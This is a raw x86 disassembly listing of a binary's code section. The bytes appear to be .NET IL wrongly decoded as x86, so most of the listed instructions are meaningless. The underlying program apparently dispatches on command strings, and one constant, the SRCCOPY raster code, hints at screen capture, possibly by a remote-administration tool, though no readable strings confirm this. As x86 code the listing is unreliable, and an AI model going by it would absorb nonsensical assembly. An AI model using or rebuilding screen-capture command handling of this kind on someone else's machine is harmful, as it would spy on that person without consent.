  403bf5:	00 00                	add    %al,(%eax)
  403bf7:	0a 28                	or     (%eax),%ch
  403bf9:	45                   	inc    %ebp
  403bfa:	00 00                	add    %al,(%eax)
  403bfc:	06                   	push   %es
  403bfd:	28 30                	sub    %dh,(%eax)
  403bff:	00 00                	add    %al,(%eax)
  403c01:	0a de                	or     %dh,%bl
  403c03:	00 38                	add    %bh,(%eax)
  403c05:	c5 02                	lds    (%edx),%eax
  403c07:	00 00                	add    %al,(%eax)
  403c09:	11 13                	adc    %edx,(%ebx)
  403c0b:	72 4f                	jb     0x403c5c
  403c0d:	14 00                	adc    $0x0,%al
  403c0f:	70 16                	jo     0x403c27
  403c11:	28 60 00             	sub    %ah,0x0(%eax)
  403c14:	00 0a                	add    %cl,(%edx)
  403c16:	16                   	push   %ss
  403c17:	33 0f                	xor    (%edi),%ecx
  403c19:	72 4f                	jb     0x403c6a
  403c1b:	14 00                	adc    $0x0,%al
  403c1d:	70 28                	jo     0x403c47
  403c1f:	45                   	inc    %ebp
  403c20:	00 00                	add    %al,(%eax)
  403c22:	06                   	push   %es
  403c23:	38 a6 02 00 00 11    	cmp    %ah,0x11000002(%esi)
  403c29:	13 72 59             	adc    0x59(%edx),%esi
  403c2c:	14 00                	adc    $0x0,%al
  403c2e:	70 16                	jo     0x403c46
  403c30:	28 60 00             	sub    %ah,0x0(%eax)
  403c33:	00 0a                	add    %cl,(%edx)
  403c35:	16                   	push   %ss
  403c36:	33 40 06             	xor    0x6(%eax),%eax
  403c39:	80 1b 00             	sbbb   $0x0,(%ebx)
  403c3c:	00 04 06             	add    %al,(%esi,%eax,1)
  403c3f:	17                   	pop    %ss
  403c40:	9a 28 0b 01 00 06 2d 	lcall  $0x2d06,$0x10b28
  403c47:	19 72 67             	sbb    %esi,0x67(%edx)
  403c4a:	14 00                	adc    $0x0,%al
  403c4c:	70 7e                	jo     0x403ccc
  403c4e:	0a 00                	or     (%eax),%al
  403c50:	00 04 06             	add    %al,(%esi,%eax,1)
  403c53:	17                   	pop    %ss
  403c54:	9a 28 39 00 00 0a 28 	lcall  $0x280a,$0x3928
  403c5b:	45                   	inc    %ebp
  403c5c:	00 00                	add    %al,(%eax)
  403c5e:	06                   	push   %es
  403c5f:	2b 12                	sub    (%edx),%edx
  403c61:	06                   	push   %es
  403c62:	17                   	pop    %ss
  403c63:	9a 28 0b 01 00 06 28 	lcall  $0x2806,$0x10b28
  403c6a:	0c 01                	or     $0x1,%al
  403c6c:	00 06                	add    %al,(%esi)
  403c6e:	28 78 00             	sub    %bh,0x0(%eax)
  403c71:	00 06                	add    %al,(%esi)
  403c73:	38 56 02             	cmp    %dl,0x2(%esi)
  403c76:	00 00                	add    %al,(%eax)
  403c78:	11 13                	adc    %edx,(%ebx)
  403c7a:	72 7d                	jb     0x403cf9
  403c7c:	14 00                	adc    $0x0,%al
  403c7e:	70 16                	jo     0x403c96
  403c80:	28 60 00             	sub    %ah,0x0(%eax)
  403c83:	00 0a                	add    %cl,(%edx)
  403c85:	16                   	push   %ss
  403c86:	33 26                	xor    (%esi),%esp
  403c88:	06                   	push   %es
  403c89:	18 9a 28 98 00 00    	sbb    %bl,0x9828(%edx)
  403c8f:	0a 13                	or     (%ebx),%dl
  403c91:	09 06                	or     %eax,(%esi)
  403c93:	17                   	pop    %ss
  403c94:	9a 11 09 28 0a 01 00 	lcall  $0x1,$0xa280911
  403c9b:	06                   	push   %es
  403c9c:	26 11 09             	adc    %ecx,%es:(%ecx)
  403c9f:	28 0c 01             	sub    %cl,(%ecx,%eax,1)
  403ca2:	00 06                	add    %al,(%esi)
  403ca4:	28 78 00             	sub    %bh,0x0(%eax)
  403ca7:	00 06                	add    %al,(%esi)
  403ca9:	38 20                	cmp    %ah,(%eax)
  403cab:	02 00                	add    (%eax),%al
  403cad:	00 11                	add    %dl,(%ecx)
  403caf:	13 72 93             	adc    -0x6d(%edx),%esi
  403cb2:	14 00                	adc    $0x0,%al
  403cb4:	70 16                	jo     0x403ccc
  403cb6:	28 60 00             	sub    %ah,0x0(%eax)
  403cb9:	00 0a                	add    %cl,(%edx)
  403cbb:	16                   	push   %ss
  403cbc:	33 28                	xor    (%eax),%ebp
  403cbe:	28 08                	sub    %cl,(%eax)
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	06                   	push   %es
  403cc3:	6f                   	outsl  %ds:(%esi),(%dx)
  403cc4:	a8 00                	test   $0x0,%al
  403cc6:	00 0a                	add    %cl,(%edx)
  403cc8:	6f                   	outsl  %ds:(%esi),(%dx)
  403cc9:	a9 00 00 0a 7e       	test   $0x7e0a0000,%eax
  403cce:	2a 00                	sub    (%eax),%al
  403cd0:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403cd3:	aa                   	stos   %al,%es:(%edi)
  403cd4:	00 00                	add    %al,(%eax)
  403cd6:	0a 72 af             	or     -0x51(%edx),%dh
  403cd9:	14 00                	adc    $0x0,%al
  403cdb:	70 28                	jo     0x403d05
  403cdd:	79 00                	jns    0x403cdf
  403cdf:	00 06                	add    %al,(%esi)
  403ce1:	38 e8                	cmp    %ch,%al
  403ce3:	01 00                	add    %eax,(%eax)
  403ce5:	00 11                	add    %dl,(%ecx)
  403ce7:	13 72 d1             	adc    -0x2f(%edx),%esi
  403cea:	14 00                	adc    $0x0,%al
  403cec:	70 16                	jo     0x403d04
  403cee:	28 60 00             	sub    %ah,0x0(%eax)
  403cf1:	00 0a                	add    %cl,(%edx)
  403cf3:	16                   	push   %ss
  403cf4:	33 4b 1b             	xor    0x1b(%ebx),%ecx
  403cf7:	8d 31                	lea    (%ecx),%esi
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	01 13                	add    %edx,(%ebx)
  403cfd:	14 11                	adc    $0x11,%al
  403cff:	14 16                	adc    $0x16,%al
  403d01:	72 d1                	jb     0x403cd4
  403d03:	14 00                	adc    $0x0,%al
  403d05:	70 a2                	jo     0x403ca9
  403d07:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403d0a:	7e 0a                	jle    0x403d16
  403d0c:	00 00                	add    %al,(%eax)
  403d0e:	04 a2                	add    $0xa2,%al
  403d10:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403d13:	28 08                	sub    %cl,(%eax)
  403d15:	01 00                	add    %eax,(%eax)
  403d17:	06                   	push   %es
  403d18:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403d1d:	0a 00                	or     (%eax),%al
  403d1f:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403d22:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403d25:	7e 0f                	jle    0x403d36
  403d27:	00 00                	add    %al,(%eax)
  403d29:	04 28                	add    $0x28,%al
  403d2b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d2c:	00 00                	add    %al,(%eax)
  403d2e:	0a a2 11 14 28 94    	or     -0x6bd7ebef(%edx),%ah
  403d34:	00 00                	add    %al,(%eax)
  403d36:	0a 28                	or     (%eax),%ch
  403d38:	45                   	inc    %ebp
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	06                   	push   %es
  403d3c:	38 8d 01 00 00 11    	cmp    %cl,0x11000001(%ebp)
  403d42:	13 72 e7             	adc    -0x19(%edx),%esi
  403d45:	14 00                	adc    $0x0,%al
  403d47:	70 16                	jo     0x403d5f
  403d49:	28 60 00             	sub    %ah,0x0(%eax)
  403d4c:	00 0a                	add    %cl,(%edx)
  403d4e:	16                   	push   %ss
  403d4f:	40                   	inc    %eax
  403d50:	7a 01                	jp     0x403d53
  403d52:	00 00                	add    %al,(%eax)
  403d54:	7e 27                	jle    0x403d7d
  403d56:	00 00                	add    %al,(%eax)
  403d58:	04 2d                	add    $0x2d,%al
  403d5a:	0d 18 28 fb 00       	or     $0xfb2818,%eax
  403d5f:	00 06                	add    %al,(%esi)
  403d61:	26 17                	es pop %ss
  403d63:	80 27 00             	andb   $0x0,(%edi)
  403d66:	00 04 de             	add    %al,(%esi,%ebx,8)
  403d69:	0c 28                	or     $0x28,%al
  403d6b:	2e 00 00             	add    %al,%cs:(%eax)
  403d6e:	0a 28                	or     (%eax),%ch
  403d70:	30 00                	xor    %al,(%eax)
  403d72:	00 0a                	add    %cl,(%edx)
  403d74:	de 00                	fiadds (%eax)
  403d76:	28 ab 00 00 0a 6f    	sub    %ch,0x6f0a0000(%ebx)
  403d7c:	ac                   	lods   %ds:(%esi),%al
  403d7d:	00 00                	add    %al,(%eax)
  403d7f:	0a 13                	or     (%ebx),%dl
  403d81:	0c 28                	or     $0x28,%al
  403d83:	ab                   	stos   %eax,%es:(%edi)
  403d84:	00 00                	add    %al,(%eax)
  403d86:	0a 6f ac             	or     -0x54(%edi),%ch
  403d89:	00 00                	add    %al,(%eax)
  403d8b:	0a 13                	or     (%ebx),%dl
  403d8d:	18 12                	sbb    %dl,(%edx)
  403d8f:	18 28                	sbb    %ch,(%eax)
  403d91:	ad                   	lods   %ds:(%esi),%eax
  403d92:	00 00                	add    %al,(%eax)
  403d94:	0a 12                	or     (%edx),%dl
  403d96:	0c 28                	or     $0x28,%al
  403d98:	ae                   	scas   %es:(%edi),%al
  403d99:	00 00                	add    %al,(%eax)
  403d9b:	0a 20                	or     (%eax),%ah
  403d9d:	05 10 02 00 73       	add    $0x73000210,%eax
  403da2:	af                   	scas   %es:(%edi),%eax
  403da3:	00 00                	add    %al,(%eax)
  403da5:	0a 13                	or     (%ebx),%dl
  403da7:	0e                   	push   %cs
  403da8:	11 0e                	adc    %ecx,(%esi)
  403daa:	28 b0 00 00 0a 13    	sub    %dh,0x130a0000(%eax)
  403db0:	0a 12                	or     (%edx),%dl
  403db2:	0b 11                	or     (%ecx),%edx
  403db4:	0e                   	push   %cs
  403db5:	6f                   	outsl  %ds:(%esi),(%dx)
  403db6:	b1 00                	mov    $0x0,%cl
  403db8:	00 0a                	add    %cl,(%edx)
  403dba:	11 0e                	adc    %ecx,(%esi)
  403dbc:	6f                   	outsl  %ds:(%esi),(%dx)
  403dbd:	b2 00                	mov    $0x0,%dl
  403dbf:	00 0a                	add    %cl,(%edx)
  403dc1:	28 b3 00 00 0a 11    	sub    %dh,0x110a0000(%ebx)
  403dc7:	0a 16                	or     (%esi),%dl
  403dc9:	16                   	push   %ss
  403dca:	16                   	push   %ss
  403dcb:	16                   	push   %ss
  403dcc:	11 0b                	adc    %ecx,(%ebx)
  403dce:	20 20                	and    %ah,(%eax)
  403dd0:	00 cc                	add    %cl,%ah
  403dd2:	00 6f b4             	add    %ch,-0x4c(%edi)
  403dd5:	00 00                	add    %al,(%eax)
  403dd7:	0a 73 49             	or     0x49(%ebx),%dh
  403dda:	00 00                	add    %al,(%eax)
  403ddc:	0a 13                	or     (%ebx),%dl
  403dde:	0f 20 00             	mov    %cr0,%eax
  403de1:	01 00                	add    %eax,(%eax)
  403de3:	00 20                	add    %ah,(%eax)
  403de5:	9c                   	pushf
  403de6:	00 00                	add    %al,(%eax)
  403de8:	00 73 b5             	add    %dh,-0x4b(%ebx)
  403deb:	00 00                	add    %al,(%eax)
  403ded:	0a 13                	or     (%ebx),%dl
  403def:	10 11                	adc    %dl,(%ecx)
  403df1:	10 28                	adc    %ch,(%eax)
  403df3:	b0 00                	mov    $0x0,%al
  403df5:	00 0a                	add    %cl,(%edx)
  403df7:	13 0d 11 0d 11 0e    	adc    0xe110d11,%ecx
  403dfd:	12 18                	adc    (%eax),%bl
  403dff:	16                   	push   %ss
  403e00:	16                   	push   %ss
  403e01:	20 00                	and    %al,(%eax)
  403e03:	01 00                	add    %eax,(%eax)
  403e05:	00 20                	add    %ah,(%eax)
  403e07:	9c                   	pushf
  403e08:	00 00                	add    %al,(%eax)
  403e0a:	00 28                	add    %ch,(%eax)
  403e0c:	b6 00                	mov    $0x0,%dh
  403e0e:	00 0a                	add    %cl,(%edx)
  403e10:	11 18                	adc    %ebx,(%eax)
  403e12:	12 17                	adc    (%edi),%dl
  403e14:	16                   	push   %ss
  403e15:	16                   	push   %ss
  403e16:	11 0e                	adc    %ecx,(%esi)
  403e18:	6f                   	outsl  %ds:(%esi),(%dx)
  403e19:	b1 00                	mov    $0x0,%cl
  403e1b:	00 0a                	add    %cl,(%edx)
  403e1d:	11 0e                	adc    %ecx,(%esi)
  403e1f:	6f                   	outsl  %ds:(%esi),(%dx)
  403e20:	b2 00                	mov    $0x0,%dl
  403e22:	00 0a                	add    %cl,(%edx)
  403e24:	28 b6 00 00 0a 11    	sub    %dh,0x110a0000(%esi)
  403e2a:	17                   	pop    %ss
  403e2b:	18 6f b7             	sbb    %ch,-0x49(%edi)
  403e2e:	00 00                	add    %al,(%eax)
  403e30:	0a 11                	or     (%ecx),%dl
  403e32:	10 11                	adc    %dl,(%ecx)
  403e34:	0f 28 b8 00 00 0a 6f 	movaps 0x6f0a0000(%eax),%xmm7
  403e3b:	b9 00 00 0a 1b       	mov    $0x1b0a0000,%ecx
  403e40:	8d 31                	lea    (%ecx),%esi
  403e42:	00 00                	add    %al,(%eax)
  403e44:	01 13                	add    %edx,(%ebx)
  403e46:	14 11                	adc    $0x11,%al
  403e48:	14 16                	adc    $0x16,%al
  403e4a:	72 f1                	jb     0x403e3d
  403e4c:	14 00                	adc    $0x0,%al
  403e4e:	70 a2                	jo     0x403df2
  403e50:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403e53:	7e 0a                	jle    0x403e5f
  403e55:	00 00                	add    %al,(%eax)
  403e57:	04 a2                	add    $0xa2,%al
  403e59:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403e5c:	28 08                	sub    %cl,(%eax)
  403e5e:	01 00                	add    %eax,(%eax)
  403e60:	06                   	push   %es
  403e61:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403e66:	0a 00                	or     (%eax),%al
  403e68:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403e6b:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403e6e:	11 0f                	adc    %ecx,(%edi)
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	7f 00                	jg     0x403e73
  403e73:	00 0a                	add    %cl,(%edx)
  403e75:	28 0d 01 00 06 28    	sub    %cl,0x28060001
  403e7b:	ba 00 00 0a a2       	mov    $0xa20a0000,%edx
  403e80:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403e83:	94                   	xchg   %eax,%esp
  403e84:	00 00                	add    %al,(%eax)
  403e86:	0a 28                	or     (%eax),%ch
  403e88:	45                   	inc    %ebp
  403e89:	00 00                	add    %al,(%eax)
  403e8b:	06                   	push   %es
  403e8c:	11 0a                	adc    %ecx,(%edx)
  403e8e:	6f                   	outsl  %ds:(%esi),(%dx)
  403e8f:	bb 00 00 0a 11       	mov    $0x110a0000,%ebx
  403e94:	0f 6f 81 00 00 0a 11 	movq   0x110a0000(%ecx),%mm0
  403e9b:	10 6f bc             	adc    %ch,-0x44(%edi)
  403e9e:	00 00                	add    %al,(%eax)
  403ea0:	0a 11                	or     (%ecx),%dl
  403ea2:	0d 6f bb 00 00       	or     $0xbb6f,%eax
  403ea7:	0a 11                	or     (%ecx),%dl
  403ea9:	0e                   	push   %cs
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	bc 00 00 0a de       	mov    $0xde0a0000,%esp
  403eb0:	0c 28                	or     $0x28,%al
  403eb2:	2e 00 00             	add    %al,%cs:(%eax)
  403eb5:	0a 28                	or     (%eax),%ch
  403eb7:	30 00                	xor    %al,(%eax)
  403eb9:	00 0a                	add    %cl,(%edx)
  403ebb:	de 00                	fiadds (%eax)
  403ebd:	de 0f                	fimuls (%edi)
  403ebf:	25 28 2e 00 00       	and    $0x2e28,%eax
  403ec4:	0a 13                	or     (%ebx),%dl
  403ec6:	11 28                	adc    %ebp,(%eax)
  403ec8:	30 00                	xor    %al,(%eax)
  403eca:	00 0a                	add    %cl,(%edx)
  403ecc:	de 00                	fiadds (%eax)
  403ece:	de 1b                	ficomps (%ebx)
  403ed0:	25 28 2e 00 00       	and    $0x2e28,%eax
  403ed5:	0a 13                	or     (%ebx),%dl
  403ed7:	12 11                	adc    (%ecx),%dl
  403ed9:	12 6f a7             	adc    -0x59(%edi),%ch
  403edc:	00 00                	add    %al,(%eax)
  403ede:	0a 28                	or     (%eax),%ch
  403ee0:	7a 00                	jp     0x403ee2
  403ee2:	00 06                	add    %al,(%esi)
  403ee4:	28 30                	sub    %dh,(%eax)
  403ee6:	00 00                	add    %al,(%eax)
  403ee8:	0a de                	or     %dh,%bl
  403eea:	00 2a                	add    %ch,(%edx)
  403eec:	41                   	inc    %ecx
  403eed:	f4                   	hlt
  403eee:	00 00                	add    %al,(%eax)
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	00 00                	add    %al,(%eax)
  403ef4:	65 01 00             	add    %eax,%gs:(%eax)
  403ef7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  403efa:	00 00                	add    %al,(%eax)
  403efc:	81 01 00 00 0c 00    	addl   $0xc0000,(%ecx)
  403f02:	00 00                	add    %al,(%eax)
  403f04:	32 00                	xor    (%eax),%al
  403f06:	00 01                	add    %al,(%ecx)
  403f08:	00 00                	add    %al,(%eax)
  403f0a:	00 00                	add    %al,(%eax)
  403f0c:	98                   	cwtl
  403f0d:	02 00                	add    (%eax),%al
  403f0f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403f12:	00 00                	add    %al,(%eax)
  403f14:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f15:	02 00                	add    (%eax),%al
  403f17:	00 0e                	add    %cl,(%esi)
  403f19:	00 00                	add    %al,(%eax)
  403f1b:	00 32                	add    %dh,(%edx)
  403f1d:	00 00                	add    %al,(%eax)
  403f1f:	01 00                	add    %eax,(%eax)
  403f21:	00 00                	add    %al,(%eax)
  403f23:	00 ea                	add    %ch,%dl
  403f25:	02 00                	add    (%eax),%al
  403f27:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403f2a:	00 00                	add    %al,(%eax)
  403f2c:	f6 02 00             	testb  $0x0,(%edx)
  403f2f:	00 0f                	add    %cl,(%edi)
  403f31:	00 00                	add    %al,(%eax)
  403f33:	00 32                	add    %dh,(%edx)
  403f35:	00 00                	add    %al,(%eax)
  403f37:	01 00                	add    %eax,(%eax)
  403f39:	00 00                	add    %al,(%eax)
  403f3b:	00 1a                	add    %bl,(%edx)
  403f3d:	03 00                	add    (%eax),%eax
  403f3f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403f42:	00 00                	add    %al,(%eax)
  403f44:	26 03 00             	add    %es:(%eax),%eax
  403f47:	00 0f                	add    %cl,(%edi)
  403f49:	00 00                	add    %al,(%eax)
  403f4b:	00 32                	add    %dh,(%edx)
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	01 00                	add    %eax,(%eax)
  403f51:	00 00                	add    %al,(%eax)
  403f53:	00 6d 03             	add    %ch,0x3(%ebp)
  403f56:	00 00                	add    %al,(%eax)
  403f58:	0c 00                	or     $0x0,%al
  403f5a:	00 00                	add    %al,(%eax)
  403f5c:	79 03                	jns    0x403f61
  403f5e:	00 00                	add    %al,(%eax)
  403f60:	0f 00 00             	sldt   (%eax)
  403f63:	00 32                	add    %dh,(%edx)
  403f65:	00 00                	add    %al,(%eax)
  403f67:	01 00                	add    %eax,(%eax)
  403f69:	00 00                	add    %al,(%eax)
  403f6b:	00 48 04             	add    %cl,0x4(%eax)
  403f6e:	00 00                	add    %al,(%eax)
  403f70:	4e                   	dec    %esi
  403f71:	00 00                	add    %al,(%eax)
  403f73:	00 96 04 00 00 52    	add    %dl,0x52000004(%esi)
  403f79:	00 00                	add    %al,(%eax)
  403f7b:	00 32                	add    %dh,(%edx)
  403f7d:	00 00                	add    %al,(%eax)
  403f7f:	01 00                	add    %eax,(%eax)
  403f81:	00 00                	add    %al,(%eax)
  403f83:	00 38                	add    %bh,(%eax)
  403f85:	06                   	push   %es
  403f86:	00 00                	add    %al,(%eax)
  403f88:	16                   	push   %ss
  403f89:	00 00                	add    %al,(%eax)
  403f8b:	00 4e 06             	add    %cl,0x6(%esi)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	0c 00                	or     $0x0,%al
  403f92:	00 00                	add    %al,(%eax)
  403f94:	32 00                	xor    (%eax),%al
  403f96:	00 01                	add    %al,(%ecx)
  403f98:	00 00                	add    %al,(%eax)
  403f9a:	00 00                	add    %al,(%eax)
  403f9c:	70 07                	jo     0x403fa5
  403f9e:	00 00                	add    %al,(%eax)
  403fa0:	25 00 00 00 95       	and    $0x95000000,%eax
  403fa5:	07                   	pop    %es
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	0c 00                	or     $0x0,%al
  403faa:	00 00                	add    %al,(%eax)
  403fac:	32 00                	xor    (%eax),%al
  403fae:	00 01                	add    %al,(%ecx)
  403fb0:	00 00                	add    %al,(%eax)
  403fb2:	00 00                	add    %al,(%eax)
  403fb4:	38 06                	cmp    %al,(%esi)
  403fb6:	00 00                	add    %al,(%eax)
  403fb8:	6b 01 00             	imul   $0x0,(%ecx),%eax
  403fbb:	00 a3 07 00 00 0f    	add    %ah,0xf000007(%ebx)
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 32                	add    %dh,(%edx)
  403fc5:	00 00                	add    %al,(%eax)
  403fc7:	01 00                	add    %eax,(%eax)
  403fc9:	00 00                	add    %al,(%eax)
  403fcb:	00 00                	add    %al,(%eax)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 b4 07 00 00 b4 07 	add    %dh,0x7b40000(%edi,%eax,1)
  403fd6:	00 00                	add    %al,(%eax)
  403fd8:	1b 00                	sbb    (%eax),%eax
  403fda:	00 00                	add    %al,(%eax)
  403fdc:	32 00                	xor    (%eax),%al
  403fde:	00 01                	add    %al,(%ecx)
  403fe0:	1b 30                	sbb    (%eax),%esi
  403fe2:	0a 00                	or     (%eax),%al
  403fe4:	b2 04                	mov    $0x4,%dl
  403fe6:	00 00                	add    %al,(%eax)
  403fe8:	1d 00 00 11 28       	sbb    $0x28110000,%eax
  403fed:	bd 00 00 0a 02       	mov    $0x20a0000,%ebp
  403ff2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff3:	be 00 00 0a 6f       	mov    $0x6f0a0000,%esi
  403ff8:	bf 00 00 0a 13       	mov    $0x130a0000,%edi
  403ffd:	05 16 13 04 38       	add    $0x38041316,%eax
  404002:	67 04 00             	addr16 add $0x0,%al
  404005:	00 11                	add    %dl,(%ecx)
  404007:	05 11 04 9a 0a       	add    $0xa9a0411,%eax
  40400c:	06                   	push   %es
  40400d:	6f                   	outsl  %ds:(%esi),(%dx)
  40400e:	c0 00 00             	rolb   $0x0,(%eax)
  404011:	0a 72 fb             	or     -0x5(%edx),%dh
  404014:	14 00                	adc    $0x0,%al
  404016:	70 16                	jo     0x40402e
  404018:	28 60 00             	sub    %ah,0x0(%eax)
  40401b:	00 0a                	add    %cl,(%edx)
  40401d:	16                   	push   %ss
  40401e:	40                   	inc    %eax
  40401f:	44                   	inc    %esp
  404020:	04 00                	add    $0x0,%al
  404022:	00 06                	add    %al,(%esi)
  404024:	6f                   	outsl  %ds:(%esi),(%dx)
  404025:	c1 00 00             	roll   $0x0,(%eax)
  404028:	0a 13                	or     (%ebx),%dl
  40402a:	07                   	pop    %es
  40402b:	16                   	push   %ss
  40402c:	13 06                	adc    (%esi),%eax
  40402e:	38 29                	cmp    %ch,(%ecx)
  404030:	04 00                	add    $0x0,%al
  404032:	00 11                	add    %dl,(%ecx)
  404034:	07                   	pop    %es
  404035:	11 06                	adc    %eax,(%esi)
  404037:	9a 0b 07 14 72 23 06 	lcall  $0x623,$0x7214070b
  40403e:	00 70 16             	add    %dh,0x16(%eax)
  404041:	8d 03                	lea    (%ebx),%eax
  404043:	00 00                	add    %al,(%eax)
  404045:	01 14 14             	add    %edx,(%esp,%edx,1)
  404048:	14 28                	adc    $0x28,%al
  40404a:	c2 00 00             	ret    $0x0
  40404d:	0a 72 09             	or     0x9(%edx),%dh
  404050:	15 00 70 16 28       	adc    $0x28167000,%eax
  404055:	c3                   	ret
  404056:	00 00                	add    %al,(%eax)
  404058:	0a 2c 65 07 14 72 11 	or     0x11721407(,%eiz,2),%ch
  40405f:	15 00 70 18 8d       	adc    $0x8d187000,%eax
  404064:	03 00                	add    (%eax),%eax
  404066:	00 01                	add    %al,(%ecx)
  404068:	13 09                	adc    (%ecx),%ecx
  40406a:	11 09                	adc    %ecx,(%ecx)
  40406c:	16                   	push   %ss
  40406d:	14 a2                	adc    $0xa2,%al
  40406f:	11 09                	adc    %ecx,(%ecx)
  404071:	17                   	pop    %ss
  404072:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  404078:	13 08                	adc    (%eax),%ecx
  40407a:	11 08                	adc    %ecx,(%eax)
  40407c:	16                   	push   %ss
  40407d:	7e 07                	jle    0x404086
  40407f:	00 00                	add    %al,(%eax)
  404081:	04 a2                	add    $0xa2,%al
  404083:	11 08                	adc    %ecx,(%eax)
  404085:	17                   	pop    %ss
  404086:	7e 08                	jle    0x404090
  404088:	00 00                	add    %al,(%eax)
  40408a:	04 a2                	add    $0xa2,%al
  40408c:	11 08                	adc    %ecx,(%eax)
  40408e:	18 7e 0a             	sbb    %bh,0xa(%esi)
  404091:	00 00                	add    %al,(%eax)
  404093:	04 a2                	add    $0xa2,%al
  404095:	11 08                	adc    %ecx,(%eax)
  404097:	19 7e 09             	sbb    %edi,0x9(%esi)
  40409a:	00 00                	add    %al,(%eax)
  40409c:	04 a2                	add    $0xa2,%al
  40409e:	11 08                	adc    %ecx,(%eax)
  4040a0:	1a 28                	sbb    (%eax),%ch
  4040a2:	08 01                	or     %al,(%ecx)
  4040a4:	00 06                	add    %al,(%esi)
  4040a6:	a2 11 08 a2 11       	mov    %al,0x11a20811
  4040ab:	09 14 14             	or     %edx,(%esp,%edx,1)
  4040ae:	14 17                	adc    $0x17,%al
  4040b0:	28 87 00 00 0a 26    	sub    %al,0x260a0000(%edi)
  4040b6:	dd e2                	fucom  %st(2)
  4040b8:	03 00                	add    (%eax),%eax
  4040ba:	00 38                	add    %bh,(%eax)
  4040bc:	96                   	xchg   %eax,%esi
  4040bd:	03 00                	add    (%eax),%eax
  4040bf:	00 07                	add    %al,(%edi)
  4040c1:	14 72                	adc    $0x72,%al
  4040c3:	23 06                	and    (%esi),%eax
  4040c5:	00 70 16             	add    %dh,0x16(%eax)
  4040c8:	8d 03                	lea    (%ebx),%eax
  4040ca:	00 00                	add    %al,(%eax)
  4040cc:	01 14 14             	add    %edx,(%esp,%edx,1)
  4040cf:	14 28                	adc    $0x28,%al
  4040d1:	c2 00 00             	ret    $0x0
  4040d4:	0a 72 1f             	or     0x1f(%edx),%dh
  4040d7:	15 00 70 16 28       	adc    $0x28167000,%eax
  4040dc:	c3                   	ret
  4040dd:	00 00                	add    %al,(%eax)
  4040df:	0a 39                	or     (%ecx),%bh
  4040e1:	9d                   	popf
  4040e2:	00 00                	add    %al,(%eax)
  4040e4:	00 72 37             	add    %dh,0x37(%edx)
  4040e7:	15 00 70 7e 0a       	adc    $0xa7e7000,%eax
  4040ec:	00 00                	add    %al,(%eax)
  4040ee:	04 28                	add    $0x28,%al
  4040f0:	2b 00                	sub    (%eax),%eax
  4040f2:	00 0a                	add    %cl,(%edx)
  4040f4:	28 08                	sub    %cl,(%eax)
  4040f6:	01 00                	add    %eax,(%eax)
  4040f8:	06                   	push   %es
  4040f9:	28 2b                	sub    %ch,(%ebx)
  4040fb:	00 00                	add    %al,(%eax)
  4040fd:	0a 7e 0a             	or     0xa(%esi),%bh
  404100:	00 00                	add    %al,(%eax)
  404102:	04 28                	add    $0x28,%al
  404104:	2b 00                	sub    (%eax),%eax
  404106:	00 0a                	add    %cl,(%edx)
  404108:	7e 1b                	jle    0x404125
  40410a:	00 00                	add    %al,(%eax)
  40410c:	04 18                	add    $0x18,%al
  40410e:	9a 28 c4 00 00 0a 28 	lcall  $0x280a,$0xc428
  404115:	8a 00                	mov    (%eax),%al
  404117:	00 0a                	add    %cl,(%edx)
  404119:	28 2b                	sub    %ch,(%ebx)
  40411b:	00 00                	add    %al,(%eax)
  40411d:	0a 7e 0a             	or     0xa(%esi),%bh
  404120:	00 00                	add    %al,(%eax)
  404122:	04 28                	add    $0x28,%al
  404124:	2b 00                	sub    (%eax),%eax
  404126:	00 0a                	add    %cl,(%edx)
  404128:	07                   	pop    %es
  404129:	14 72                	adc    $0x72,%al
  40412b:	11 15 00 70 18 8d    	adc    %edx,0x8d187000
  404131:	03 00                	add    (%eax),%eax
  404133:	00 01                	add    %al,(%ecx)
  404135:	13 08                	adc    (%eax),%ecx
  404137:	11 08                	adc    %ecx,(%eax)
  404139:	16                   	push   %ss
  40413a:	14 a2                	adc    $0xa2,%al
  40413c:	11 08                	adc    %ecx,(%eax)
  40413e:	17                   	pop    %ss
  40413f:	17                   	pop    %ss
  404140:	8d 03                	lea    (%ebx),%eax
  404142:	00 00                	add    %al,(%eax)
  404144:	01 13                	add    %edx,(%ebx)
  404146:	09 11                	or     %edx,(%ecx)
  404148:	09 16                	or     %edx,(%esi)
  40414a:	7e 1b                	jle    0x404167
  40414c:	00 00                	add    %al,(%eax)
  40414e:	04 18                	add    $0x18,%al
  404150:	9a 28 c4 00 00 0a 8c 	lcall  $0x8c0a,$0xc428
  404157:	7f 00                	jg     0x404159
  404159:	00 01                	add    %al,(%ecx)
  40415b:	a2 11 09 a2 11       	mov    %al,0x11a20911
  404160:	08 14 14             	or     %dl,(%esp,%edx,1)
  404163:	14 28                	adc    $0x28,%al
  404165:	c2 00 00             	ret    $0x0
  404168:	0a 28                	or     (%eax),%ch
  40416a:	75 00                	jne    0x40416c
  40416c:	00 0a                	add    %cl,(%edx)
